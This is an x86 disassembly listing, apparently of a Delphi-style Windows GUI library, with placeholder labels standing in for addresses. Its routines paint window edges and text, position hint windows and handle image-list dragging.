mov eax [ ebp - 0x38 ]
neg eax
push eax
mov eax [ ebp - 0x3c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x194 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x198 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_3a89b74
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
add esi [ ecx + 0x198 ]
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x8
je r-xdata
add [ ebp - 0x24 ] esi
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x192 ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x195 ]
or ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1d9 ]
or ecx [ ebx * 4 + rw-data ]
or ecx 0x2000
push ecx
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
add [ ebp - 0x20 ] esi
sub_3ab8ec4
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0xc ]
mov eax esi
call sub_3aaf6c0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax esi
call sub_3ab4a48
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_3ab0e78
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_3ab25e4
sub_3ab8f3c
push ebx
mov ebx edx
mov dl 0x1
call sub_3ac463c
test eax eax
je r-xdata
pop ebx
retn
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x10002
mov edx 0x127
call sub_3ab0e78
jmp r-xdata
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x20002
mov edx 0x127
call sub_3ab0e78
add ebx 0xffffffed
sub bx 0x4
jae r-xdata
sub_3ab8f88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ab8ff1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ab5368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab901c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab9014
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ab9074
push esi
mov esi eax
mov ecx [ eax + 0x30 ]
jmp r-xdata
cmp [ esi + 0x94 ] 0x0
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
pop esi
retn
and edx 0x7f
push edx
mov ecx eax
mov eax esi
mov edx 0xb046
call sub_3aaf71c
mov esi ecx
mov ecx [ ecx + 0x30 ]
sub_3ab90b8
push ebx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
pop ebx
retn
sub_3ab90e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx [ esi + 0x94 ]
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab6680
dec eax
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab9120
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
test bl bl
je r-xdata
and [ ebp + 0x54 ] 0xdfff
or [ ebp + 0x54 ] 0x2000
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x1d0 ]
test eax eax
je r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebp + 0x1d0 ]
call sub_3a7a494
mov edx ebx
call sub_3ab9120
inc edi
dec esi
jne r-xdata
sub_3ab916c
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
test [ ebx + 0x1c ] 0x2
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x48 ]
mov [ esi ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4 ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x242 ]
mov [ esi ] eax
mov eax [ ebx + 0x246 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_3ab91e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
push ebp
push sub_3ab9258
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aafa5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab925f
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
sub_3ab9264
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3aae9e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x190 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ab92c0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x190 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3aaeae0
test bl bl
jle r-xdata
xor eax eax
call sub_3aac954
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ab9300
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3ab93a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a3c8
xor eax eax
push ebp
push sub_3ab9385
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab938c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
xor edx edx
call sub_3a8a3c8
retn
sub_3ab93b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab9ce8
mov edx 0x80ffff
mov eax esi
call sub_3aafd28
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x250 ]
call sub_3a8a25c
mov eax [ esi + 0x250 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_3a89c5c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ab9424
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3ab3d30
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_3a6dbb4
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_3ab3cc8
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_3ab9490
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ab94e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab94ed
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
sub_3ab94f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3ab958d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
call sub_3a89220
mov eax ebx
call sub_3ab2588
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3aafb88
mov eax [ ebp - 0x14 ]
call sub_3a65730
push eax
mov eax [ ebx + 0x250 ]
call sub_3a8a340
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab9594
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
sub_3ab959c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x109
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_3ab960c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3ab9697
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3ab905c
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab969e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x250 ]
call sub_3a8a19c
mov edx eax
add edx 0x6
mov eax ebx
call sub_3aaf278
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_3a8a1b8
mov edx eax
add edx 0x4
mov eax ebx
call sub_3aaf2ac
sub_3ab96a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
xor edx edx
push ebp
push sub_3ab990f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3aafbb8
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3ab0f20
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_3a78df4
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_3acd810
mov ebx eax
mov eax ebx
call sub_3acc60c
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jge r-xdata
mov eax ebx
call sub_3acc5d8
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov eax ebx
call sub_3acc60c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3aaf278
mov eax ebx
call sub_3acc5f4
mov edi eax
mov eax ebx
call sub_3acc5d8
add edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
add eax [ ebp - 0x14 ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_3acc5d8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3aaf2ac
mov eax ebx
call sub_3acc5c0
mov edi eax
mov eax ebx
call sub_3acc60c
add edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
add eax [ ebp - 0x18 ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_3acc5f4
mov edi eax
mov eax ebx
call sub_3acc5d8
add edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
mov [ ebp - 0x14 ] edi
mov eax ebx
call sub_3acc5c0
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax ebx
call sub_3acc5c0
mov edi eax
mov eax ebx
call sub_3acc60c
add edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x48 ]
mov [ ebp - 0x18 ] edi
mov eax ebx
call sub_3acc5f4
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax ebx
call sub_3acc5c0
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x25c ]
cmp eax 0xfa
jbe r-xdata
mov eax ebx
call sub_3acc5f4
mov [ ebp - 0xc ] eax
xor eax eax
mov eax esi
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_3ab4820
push 0x4
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab9916
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x64
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test al al
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_3abcf30
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call [ rw-data ]
sub_3ab9920
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3ab9948
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_3a78e1c
mov eax esi
call sub_3ab2588
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov eax [ esi + 0x250 ]
call sub_3a8a340
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_3ab99a4
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_3a78e1c
call sub_3abdd24
call sub_3abde2c
test al al
jne r-xdata
call sub_3abdd24
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_3abe0bc
push esp
push 0x1
push 0xf
push 0x0
call sub_3abdd24
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_3abde9c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_3ab9a10
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_3ab5890
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
pop esi
pop ebx
retn
sub_3ab9a38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3ab9a90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_3abec10
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3ab9afc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3abf54c
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_3ab9b28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_3abea4c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_3ab9b9c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_3ab9a90
mov eax [ rw-data ]
mov eax [ eax ]
movzx eax [ eax + 0x44 ]
mov [ esi + 0x7c ] ax
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x68 ]
call sub_3acce44
sub_3ab9b9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_3abea4c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_3ab9c00
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ab9a38
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_3ab9c00
push ebx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_3ab9c24
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_3ab9a38
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_3ab9c98
push ebx
push esi
mov esi eax
mov eax esi
call sub_3abea4c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_3ab9c00
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_3ab9ad8
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x7c ]
call sub_3acce44
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_3ab9ce8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ab29f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x250 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ab9d44
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ab9d94
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3ab9e32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx ebx
call sub_3a8a3c8
xor eax eax
push ebp
push sub_3ab9e0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3aae444
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab9e16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor edx edx
call sub_3a8a3c8
retn
sub_3ab9e44
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_3ab9ee0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_3ab9e60
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_3ab9ebc
push ebx
push esi
xor esi esi
call sub_3aba504
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aba4dc
mov ebx eax
inc esi
test ebx ebx
jne r-xdata
sub_3ab9ee0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_3aba504
mov esi eax
test esi esi
je r-xdata
movzx ebx [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_3ab9ee0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_3ab9f18
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_3ab9fa8
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov edx 0x2
